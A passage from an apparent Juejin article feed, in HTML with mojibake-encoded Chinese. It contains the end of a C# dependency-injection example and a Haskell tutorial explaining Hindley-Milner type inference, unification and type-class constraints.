<span class="hljs-comment">// services.AddSingleton&lt;PlcFacade&gt;();</span>

<span class="hljs-comment">// ä½¿ç”¨ï¼šä¸šåŠ¡ç±»åªè¦å£°æ˜ä¾èµ–å³å¯</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlarmService</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PlcFacade _plc;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AlarmService</span>(<span class="hljs-params">PlcFacade plc</span>)</span> =&gt; _plc = plc;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Ack</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>
    {
        _plc.WriteInt32(address, <span class="hljs-number">1</span>);
    }
}
</code></pre>
<p>ä½ ä¼šå‘ç°ï¼šå½“ä½ æŠŠâ€œåˆ›å»º/é€‰æ‹©â€ç§»å‡ºä¸šåŠ¡ä»£ç åï¼Œå¾ˆå¤šè®¾è®¡æ¨¡å¼ä¼šå˜å¾—æ›´è‡ªç„¶ã€æ›´å°‘ç„¦è™‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹æ¨æ–­æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7604690250343628850</link>    <guid>https://juejin.cn/post/7604690250343628850</guid>    <pubDate>2026-02-09T08:46:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250343628850" data-draft-id="7604301929120972809" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹æ¨æ–­æœºåˆ¶"/> <meta itemprop="keywords" content="åç«¯,Haskell"/> <meta itemprop="datePublished" content="2026-02-09T08:46:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - ç±»å‹æ¨æ–­æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:46:18.000Z" title="Mon Feb 09 2026 08:46:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.1 ç±»å‹æ¨æ–­çš„è®¾è®¡èƒŒæ™¯ä¸ä»·å€¼</h2>
<p>åœ¨Haskellçš„è®¾è®¡ä¸­ï¼Œç±»å‹æ¨æ–­å¹¶éâ€œé”¦ä¸Šæ·»èŠ±â€ï¼Œè€Œæ˜¯ä¸ºäº†è§£å†³é™æ€ç±»å‹ä¸åŠ¨æ€ç±»å‹è¯­è¨€çš„æ ¸å¿ƒç—›ç‚¹ï¼Œæ˜¯å¹³è¡¡â€œå®‰å…¨â€ä¸â€œç®€æ´â€çš„å…³é”®è®¾è®¡ã€‚</p>
<h3 data-id="heading-1">1.1.1 è®¾è®¡ç—›ç‚¹ï¼šé™æ€ä¸åŠ¨æ€ç±»å‹çš„ä¸¤éš¾å›°å¢ƒ</h3>
<p>åœ¨Haskellè¯ç”Ÿå‰ï¼Œç¼–ç¨‹è¯­è¨€çš„ç±»å‹ç³»ç»Ÿé™·å…¥ä¸¤å¤§æç«¯ï¼š</p>
<ul>
<li>
<p>é™æ€ç±»å‹è¯­è¨€ï¼ˆå¦‚C/Javaï¼‰ï¼šéœ€æ‰‹åŠ¨æ ‡æ³¨å‡ ä¹æ‰€æœ‰æ ‡è¯†ç¬¦çš„ç±»å‹ï¼Œå†—ä½™æ ‡æ³¨å¢åŠ å¼€å‘æˆæœ¬ï¼ˆå¦‚Javaçš„<code>List&lt;String&gt; list = new ArrayList&lt;String&gt;()</code>ï¼‰ï¼Œä¸”æ ‡æ³¨ä¸é€»è¾‘é‡å¤ï¼Œæ˜“å‡ºç°â€œæ ‡æ³¨ä¸ä»£ç ä¸ä¸€è‡´â€çš„ç»´æŠ¤é—®é¢˜ï¼›</p>
</li>
<li>
<p>åŠ¨æ€ç±»å‹è¯­è¨€ï¼ˆå¦‚Python/JSï¼‰ï¼šæ— ç¼–è¯‘æœŸç±»å‹æ£€æŸ¥ï¼Œç±»å‹é”™è¯¯åªèƒ½åœ¨è¿è¡Œæ—¶æš´éœ²ï¼Œå¯¹äºå¤§å‹é¡¹ç›®ï¼Œè°ƒè¯•æˆæœ¬æé«˜ï¼Œä¸”æ— æ³•æå‰æ‹¦æˆªåŸºç¡€çš„ç±»å‹è¯¯ç”¨ï¼ˆå¦‚ç”¨å­—ç¬¦ä¸²å‚ä¸æ•°å€¼è¿ç®—ï¼‰ã€‚</p>
</li>
</ul>
<p>Haskell çš„è®¾è®¡ç›®æ ‡æ˜¯æ‰“ç ´è¿™ç§ä¸¤éš¾â€”â€”æ—¢ä¿ç•™é™æ€ç±»å‹çš„ç¼–è¯‘æœŸå®‰å…¨ï¼Œåˆæ— éœ€æ‰‹åŠ¨æ ‡æ³¨æ‰€æœ‰ç±»å‹ï¼Œç±»å‹æ¨æ–­æ­£æ˜¯å®ç°è¿™ä¸€ç›®æ ‡çš„æ ¸å¿ƒæ‰‹æ®µã€‚</p>
<h3 data-id="heading-2">1.1.2 ç±»å‹æ¨æ–­çš„æ ¸å¿ƒä»·å€¼ï¼šå®‰å…¨ä¸ç®€æ´çš„ç»Ÿä¸€</h3>
<p>ç±»å‹æ¨æ–­ä¸ºHaskellå¸¦æ¥äº†ä¸‰å¤§æ ¸å¿ƒä»·å€¼ï¼š</p>
<ol>
<li>
<p>ä¿ç•™é™æ€ç±»å‹çš„å®‰å…¨æ€§ï¼šç¼–è¯‘å™¨é€šè¿‡æ¨æ–­å®Œæˆå…¨é‡ç±»å‹æ£€æŸ¥ï¼Œæ‰€æœ‰ç±»å‹é”™è¯¯åœ¨ç¼–è¯‘æœŸæš´éœ²ï¼Œå½»åº•æœç»â€œç±»å‹ä¸åŒ¹é…â€çš„è¿è¡Œæ—¶å´©æºƒï¼›</p>
</li>
<li>
<p>æ¶ˆé™¤å†—ä½™æ ‡æ³¨ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼šä»…éœ€åœ¨å°‘æ•°æ­§ä¹‰åœºæ™¯æ ‡æ³¨ç±»å‹ï¼Œå¤§éƒ¨åˆ†ä»£ç æ— éœ€æ‰‹åŠ¨å£°æ˜ï¼Œè¯­æ³•ç®€æ´åº¦æ¥è¿‘åŠ¨æ€ç±»å‹è¯­è¨€ï¼›</p>
</li>
<li>
<p>æ³›å‹ä»£ç çš„å¤©ç„¶æ”¯æŒï¼šæ¨æ–­ç»“æœé»˜è®¤æ˜¯â€œæœ€ä¸€èˆ¬é€šç”¨ç±»å‹ï¼ˆMGUï¼‰â€ï¼Œè®©ä»£ç å¤©ç„¶å…·å¤‡æ³›å‹èƒ½åŠ›ï¼ˆå¦‚æ’ç­‰å‡½æ•°å¯é€‚é…æ‰€æœ‰ç±»å‹ï¼‰ã€‚</p>
</li>
</ol>
<h3 data-id="heading-3">1.1.3 Hindley-Milnerç®—æ³•çš„å®šä½ï¼šHaskellç±»å‹æ¨æ–­çš„åº•å±‚æ ¸å¿ƒ</h3>
<p>Haskellçš„ç±»å‹æ¨æ–­å¹¶éâ€œç»éªŒæ€§çŒœæµ‹â€ï¼Œè€Œæ˜¯åŸºäºä¸¥æ ¼çš„Hindley-Milnerï¼ˆHMï¼‰ç®—æ³•å®ç°ï¼š</p>
<ul>
<li>
<p>ç®—æ³•å®šä½ï¼šHMç®—æ³•æ˜¯Haskellç±»å‹æ¨æ–­çš„â€œåº•å±‚å¼•æ“â€ï¼ŒGHCç¼–è¯‘å™¨çš„ç±»å‹æ¨æ–­æ¨¡å—å®Œå…¨åŸºäºè¯¥ç®—æ³•è®¾è®¡ï¼›</p>
</li>
<li>
<p>æ ¸å¿ƒä¼˜åŠ¿ï¼šå…¼é¡¾é«˜æ•ˆæ€§ï¼ˆçº¿æ€§æ—¶é—´å¤æ‚åº¦ï¼Œé€‚é…å¤§è§„æ¨¡ä»£ç ï¼‰ä¸é€šç”¨æ€§ï¼ˆæ”¯æŒå¤šæ€ã€å‡½æ•°åµŒå¥—ç­‰å¤æ‚åœºæ™¯ï¼‰ï¼›</p>
</li>
<li>
<p>è®¾è®¡é€‚é…ï¼šHMç®—æ³•å¤©ç„¶é€‚é…çº¯å‡½æ•°å¼è¯­è¨€çš„ç‰¹æ€§ï¼ˆæ— å‰¯ä½œç”¨ã€å¼•ç”¨é€æ˜ï¼‰ï¼Œæ˜¯Haskellé€‰æ‹©è¯¥ç®—æ³•çš„æ ¸å¿ƒåŸå› ã€‚</p>
</li>
</ul>
<h2 data-id="heading-4">1.2 Hindley-Milnerç®—æ³•çš„æ ¸å¿ƒåŸç†</h2>
<p>HMç®—æ³•çš„æœ¬è´¨æ˜¯â€œé€šè¿‡æ•°å­¦åŒ–çš„é€»è¾‘æ¨å¯¼ï¼Œä¸ºè¡¨è¾¾å¼åˆ†é…å”¯ä¸€çš„æœ€ä¸€èˆ¬é€šç”¨ç±»å‹â€ï¼Œå…¶æ ¸å¿ƒæ€æƒ³ç®€æ´ä¸”ä¸¥è°¨ã€‚</p>
<h3 data-id="heading-5">1.2.1 æ ¸å¿ƒæ€æƒ³ï¼šç±»å‹å˜é‡ + åˆä¸€æ±‚è§£</h3>
<p>HMç®—æ³•çš„æ ¸å¿ƒé€»è¾‘å¯æ¦‚æ‹¬ä¸ºï¼š</p>
<ol>
<li>
<p>æœªçŸ¥ç±»å‹æŠ½è±¡ä¸ºå˜é‡ï¼šä¸ºæ‰€æœ‰æœªç¡®å®šç±»å‹çš„è¡¨è¾¾å¼åˆ†é…â€œç±»å‹å˜é‡â€ï¼ˆå¦‚<code>a</code>ã€<code>b</code>ã€<code>c</code>ï¼‰ï¼Œè¡¨ç¤ºâ€œä»»æ„å¾…å®šç±»å‹â€ï¼›</p>
</li>
<li>
<p>ç”Ÿæˆç±»å‹çº¦æŸç­‰å¼ï¼šæ ¹æ®ä»£ç é€»è¾‘ï¼ˆå¦‚å‡½æ•°è°ƒç”¨ã€è¿ç®—ç¬¦ä½¿ç”¨ï¼‰ï¼Œç”Ÿæˆç±»å‹å˜é‡ä¹‹é—´çš„çº¦æŸå…³ç³»ï¼ˆå¦‚<code>f</code>æ˜¯<code>a-&gt;b</code>ï¼Œ<code>f x</code>ä¸­<code>x</code>çš„ç±»å‹å¿…é¡»æ˜¯<code>a</code>ï¼‰ï¼›</p>
</li>
<li>
<p>åˆä¸€ç®—æ³•æ±‚è§£çº¦æŸï¼šé€šè¿‡â€œåˆä¸€ï¼ˆUnificationï¼‰â€ç®—æ³•æ±‚è§£çº¦æŸç­‰å¼ï¼Œå°†ç±»å‹å˜é‡æ›¿æ¢ä¸ºå…·ä½“ç±»å‹æˆ–æ›´ç²¾ç¡®çš„å˜é‡ï¼›</p>
</li>
<li>
<p>æ³›åŒ–å¾—åˆ°æœ€é€šç”¨ç±»å‹ï¼šå°†æ— çº¦æŸçš„ç±»å‹å˜é‡æ³›åŒ–ä¸ºâ€œä»»æ„ç±»å‹â€ï¼Œæœ€ç»ˆå¾—åˆ°è¡¨è¾¾å¼çš„â€œæœ€ä¸€èˆ¬é€šç”¨ç±»å‹ï¼ˆMGUï¼‰â€ã€‚</p>
</li>
</ol>
<h3 data-id="heading-6">1.2.2 ä¸‰æ­¥æ ¸å¿ƒæµç¨‹ï¼šä»çº¦æŸåˆ°é€šç”¨ç±»å‹</h3>
<p>HMç®—æ³•çš„æ‰§è¡Œå¯æ‹†è§£ä¸ºä¸‰ä¸ªæ ¸å¿ƒæ­¥éª¤ï¼Œä»¥æ’ç­‰å‡½æ•°<code>id x = x</code>ä¸ºä¾‹ï¼š</p>
<h4 data-id="heading-7">æ­¥éª¤1ï¼šç”Ÿæˆç±»å‹çº¦æŸ</h4>
<ul>
<li>
<p>ä¸º<code>id</code>åˆ†é…ç±»å‹å˜é‡<code>Ï„1</code>ï¼Œä¸ºå‚æ•°<code>x</code>åˆ†é…ç±»å‹å˜é‡<code>a</code>ï¼›</p>
</li>
<li>
<p>å‡½æ•°ä½“<code>x</code>çš„ç±»å‹æ˜¯<code>a</code>ï¼Œå› æ­¤<code>id</code>çš„ç±»å‹éœ€æ»¡è¶³<code>Ï„1 = a -&gt; a</code>ï¼ˆè¾“å…¥<code>a</code>ï¼Œè¿”å›<code>a</code>ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-8">æ­¥éª¤2ï¼šåˆä¸€ç±»å‹å˜é‡</h4>
<ul>
<li>
<p>æ— å†²çªçº¦æŸï¼Œç›´æ¥åˆä¸€ï¼š<code>Ï„1</code>ç¡®å®šä¸º<code>a -&gt; a</code>ï¼›</p>
</li>
<li>
<p>åˆä¸€çš„æ ¸å¿ƒè§„åˆ™ï¼šä»…å½“ä¸¤ä¸ªç±»å‹â€œç»“æ„åŒ¹é…â€æ—¶å¯åˆä¸€ï¼ˆå¦‚<code>a</code>ä¸<code>Int</code>åˆä¸€ä¸º<code>Int</code>ï¼Œ<code>a-&gt;b</code>ä¸<code>Int-&gt;c</code>åˆä¸€ä¸º<code>Int-&gt;c</code>ï¼‰ï¼Œå†²çªåˆ™æŠ¥é”™ï¼ˆå¦‚<code>a</code>ä¸<code>Int-&gt;b</code>æ— æ³•åˆä¸€ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-9">æ­¥éª¤3ï¼šæ³›åŒ–æ— çº¦æŸç±»å‹</h4>
<ul>
<li>
<p><code>a</code>æ˜¯æ— ä»»ä½•çº¦æŸçš„ç±»å‹å˜é‡ï¼Œå› æ­¤å°†å…¶æ³›åŒ–ä¸ºâ€œä»»æ„ç±»å‹â€ï¼›</p>
</li>
<li>
<p>æœ€ç»ˆ<code>id</code>çš„ç±»å‹ä¸º<code>forall a. a -&gt; a</code>ï¼ˆç®€å†™ä¸º<code>a -&gt; a</code>ï¼‰ï¼Œå³â€œæ¥æ”¶ä»»æ„ç±»å‹ï¼Œè¿”å›åŒç±»å‹å€¼â€ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">1.2.3 ç±»å‹å˜é‡çš„è®¾è®¡ï¼šå°å†™å­—æ¯çš„çº¦å®š</h3>
<p>HMç®—æ³•ä¸­ï¼Œç±»å‹å˜é‡çš„è®¾è®¡éµå¾ªæ˜ç¡®çš„è¯­æ³•çº¦å®šï¼š</p>
<ul>
<li>
<p>ç±»å‹å˜é‡ï¼šç”¨å°å†™å­—æ¯ï¼ˆ<code>a</code>ã€<code>b</code>ã€<code>c</code>ï¼‰æˆ–å°å†™å¼€å¤´çš„æ ‡è¯†ç¬¦ï¼ˆ<code>t</code>ã€<code>elem</code>ï¼‰è¡¨ç¤ºï¼Œä»£è¡¨â€œä»»æ„å¾…å®šç±»å‹â€ï¼›</p>
</li>
<li>
<p>å…·ä½“ç±»å‹ï¼šç”¨å¤§å†™å­—æ¯å¼€å¤´çš„æ ‡è¯†ç¬¦è¡¨ç¤ºï¼ˆ<code>Int</code>ã€<code>String</code>ã€<code>Bool</code>ï¼‰ï¼Œæ˜¯ç¡®å®šçš„ç±»å‹ï¼›</p>
</li>
<li>
<p>è®¾è®¡ä»·å€¼ï¼šé€šè¿‡è¯­æ³•åŒºåˆ†â€œå¾…å®šç±»å‹â€ä¸â€œç¡®å®šç±»å‹â€ï¼Œè®©ç¼–è¯‘å™¨å’Œç¨‹åºå‘˜å¿«é€Ÿè¯†åˆ«æ³›å‹é€»è¾‘ï¼Œé¿å…æ­§ä¹‰ã€‚</p>
</li>
</ul>
<h2 data-id="heading-11">1.3 Haskellä¸­çš„ä¸¤ç±»ç±»å‹æ¨æ–­</h2>
<p>Haskellåœ¨HMç®—æ³•åŸºç¡€ä¸Šï¼Œæ ¹æ®æ˜¯å¦æ¶‰åŠâ€œç±»å‹ç±»çº¦æŸâ€ï¼Œå°†ç±»å‹æ¨æ–­åˆ†ä¸ºä¸¤ç±»ï¼Œè¦†ç›–æ‰€æœ‰ä»£ç åœºæ™¯ã€‚</p>
<h3 data-id="heading-12">1.3.1 æ— çº¦æŸæ¨æ–­ï¼šçº¯æ³›å‹ç±»å‹çš„æ¨å¯¼</h3>
<p>æ— çº¦æŸæ¨æ–­æ˜¯HMç®—æ³•çš„â€œåŸç”Ÿåº”ç”¨â€ï¼Œé€‚ç”¨äºæ— ç±»å‹ç±»ä¾èµ–çš„çº¯æ³›å‹åœºæ™¯ã€‚</p>
<h4 data-id="heading-13">è®¾è®¡åœºæ™¯</h4>
<p>å½“è¡¨è¾¾å¼ä¸æ¶‰åŠä»»ä½•ç±»å‹ç±»æ“ä½œï¼ˆå¦‚<code>+</code>ã€<code>==</code>ã€<code>show</code>ï¼‰ï¼Œä»…ä¾èµ–ç±»å‹ç»“æ„æ—¶ï¼Œè§¦å‘æ— çº¦æŸæ¨æ–­ï¼š</p>
<ul>
<li>
<p>çº¯æ³›å‹å‡½æ•°ï¼ˆå¦‚æ’ç­‰å‡½æ•°ã€åˆ—è¡¨æ˜ å°„å‡½æ•°ã€å…ƒç»„äº¤æ¢å‡½æ•°ï¼‰ï¼›</p>
</li>
<li>
<p>æ— è¿ç®—ç¬¦çš„ç®€å•è¡¨è¾¾å¼ï¼ˆå¦‚å˜é‡å¼•ç”¨ã€å‡½æ•°åµŒå¥—è°ƒç”¨ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-14">æ¨å¯¼ç»“æœ</h4>
<p>æœ€ç»ˆå¾—åˆ°çº¯æ³›å‹ç±»å‹ï¼ˆä»…å«ç±»å‹å˜é‡ï¼Œæ— ä»»ä½•<code>=&gt;</code>çº¦æŸï¼‰ï¼Œå¯é€‚é…ä»»æ„å…·ä½“ç±»å‹ã€‚</p>
<h4 data-id="heading-15">ç¤ºä¾‹éªŒè¯ï¼šåˆ—è¡¨æ˜ å°„å‡½æ•°<code>map</code>çš„æ¨æ–­è¿‡ç¨‹</h4>
<pre><code class="hljs language-arduino" lang="arduino">-- å‡½æ•°å®šä¹‰ï¼šmap f [] = []; <span class="hljs-function">map <span class="hljs-title">f</span> <span class="hljs-params">(x:xs)</span> </span>= f x : map f xs
    
</code></pre>
<p>æ¨æ–­æ­¥éª¤ï¼š</p>
<ol>
<li>
<p>ä¸º<code>map</code>åˆ†é…ç±»å‹å˜é‡<code>Ï„</code>ï¼Œ<code>f</code>åˆ†é…<code>a-&gt;b</code>ï¼Œ<code>x</code>åˆ†é…<code>a</code>ï¼Œ<code>xs</code>åˆ†é…<code>[a]</code>ï¼›</p>
</li>
<li>
<p><code>f x</code>çš„ç±»å‹æ˜¯<code>b</code>ï¼Œå› æ­¤<code>: </code>è¿ç®—ç¬¦è¦æ±‚<code>map f xs</code>çš„ç±»å‹æ˜¯<code>[b]</code>ï¼›</p>
</li>
<li>
<p>åˆä¸€çº¦æŸï¼š<code>Ï„ = (a-&gt;b) -&gt; [a] -&gt; [b]</code>ï¼›</p>
</li>
<li>
<p>æ³›åŒ–æ— çº¦æŸå˜é‡<code>a</code>ã€<code>b</code>ï¼Œæœ€ç»ˆç±»å‹ä¸º<code>(a -&gt; b) -&gt; [a] -&gt; [b]</code>ã€‚</p>
</li>
</ol>
<p>è¯¥ç±»å‹å¯é€‚é…ä»»æ„ç±»å‹çš„æ˜ å°„ï¼ˆå¦‚<code>map show [1,2]</code>ã€<code>map length ["a","ab"]</code>ï¼‰ï¼Œä½“ç°çº¯æ³›å‹çš„çµæ´»æ€§ã€‚</p>
<h3 data-id="heading-16">1.3.2 çº¦æŸæ¨æ–­ï¼šå¸¦ç±»å‹ç±»çº¦æŸçš„æ¨å¯¼</h3>
<p>å½“è¡¨è¾¾å¼æ¶‰åŠç±»å‹ç±»æ“ä½œæ—¶ï¼ŒHaskellä¼šåœ¨HMç®—æ³•åŸºç¡€ä¸Šå¢åŠ â€œç±»å‹ç±»çº¦æŸâ€ï¼Œå½¢æˆçº¦æŸæ¨æ–­ã€‚</p>
<h4 data-id="heading-17">è®¾è®¡åœºæ™¯</h4>
<p>è¡¨è¾¾å¼ä½¿ç”¨äº†ç±»å‹ç±»å®šä¹‰çš„æ–¹æ³•/è¿ç®—ç¬¦ï¼ˆå¦‚<code>+</code>ä¾èµ–<code>Num</code>ã€<code>==</code>ä¾èµ–<code>Eq</code>ã€<code>show</code>ä¾èµ–<code>Show</code>ï¼‰ï¼Œéœ€è¦é™åˆ¶ç±»å‹å˜é‡çš„èŒƒå›´ã€‚</p>
<h4 data-id="heading-18">æ¨å¯¼ç»“æœ</h4>
<p>æœ€ç»ˆå¾—åˆ°å¸¦ç±»å‹ç±»çº¦æŸçš„æ³›å‹ç±»å‹ï¼ˆæ ¼å¼ï¼š<code>çº¦æŸ =&gt; æ³›å‹ç±»å‹</code>ï¼‰ï¼Œä»…é€‚é…æ»¡è¶³çº¦æŸçš„ç±»å‹ã€‚</p>
<h4 data-id="heading-19">ç¤ºä¾‹éªŒè¯ï¼šåŠ æ³•å‡½æ•°<code>add x y = x + y</code>çš„æ¨æ–­è¿‡ç¨‹</h4>
<ol>
<li>
<p>ä¸º<code>add</code>åˆ†é…<code>Ï„</code>ï¼Œ<code>x</code>åˆ†é…<code>a</code>ï¼Œ<code>y</code>åˆ†é…<code>a</code>ï¼›</p>
</li>
<li>
<p><code>+</code>è¿ç®—ç¬¦è¦æ±‚<code>a</code>å¿…é¡»å®ç°<code>Num</code>ç±»å‹ç±»ï¼ˆçº¦æŸï¼š<code>Num a</code>ï¼‰ï¼›</p>
</li>
<li>
<p>åˆä¸€çº¦æŸï¼š<code>Ï„ = Num a =&gt; a -&gt; a -&gt; a</code>ï¼›</p>
</li>
<li>
<p>æ³›åŒ–åæœ€ç»ˆç±»å‹ä¸º<code>Num a =&gt; a -&gt; a -&gt; a</code>ã€‚</p>
</li>
</ol>
<p>è¯¥ç±»å‹ä»…é€‚é…<code>Num</code>çš„å®ä¾‹ç±»å‹ï¼ˆ<code>Int</code>ã€<code>Double</code>ç­‰ï¼‰ï¼Œæ— æ³•é€‚é…<code>String</code>ç­‰éæ•°å€¼ç±»å‹ï¼Œä¿è¯äº†æ“ä½œçš„åˆæ³•æ€§ã€‚</p>
<h4 data-id="heading-20">çº¦æŸçš„ä¼ é€’ä¸ç»„åˆ</h4>
<p>å½“è¡¨è¾¾å¼æ¶‰åŠå¤šä¸ªç±»å‹ç±»æ“ä½œæ—¶ï¼Œçº¦æŸä¼šè‡ªåŠ¨ç»„åˆå¹¶ä¼ é€’ï¼š</p>
<pre><code class="hljs language-css" lang="css">-- å‡½æ•°ï¼šè®¡ç®—å¹¶å±•ç¤ºç»“æœï¼Œæ¶‰åŠNumï¼ˆ+ï¼‰å’ŒShowï¼ˆshowï¼‰
calcAndShow x y = show (x + y)
-- æ¨æ–­ç±»å‹ï¼š(Num <span class="hljs-selector-tag">a</span>, Show <span class="hljs-selector-tag">a</span>) =&gt; <span class="hljs-selector-tag">a</span> -&gt; <span class="hljs-selector-tag">a</span> -&gt; String
-- çº¦æŸç»„åˆï¼š<span class="hljs-selector-tag">a</span>éœ€åŒæ—¶æ»¡è¶³Numå’ŒShow
</code></pre>
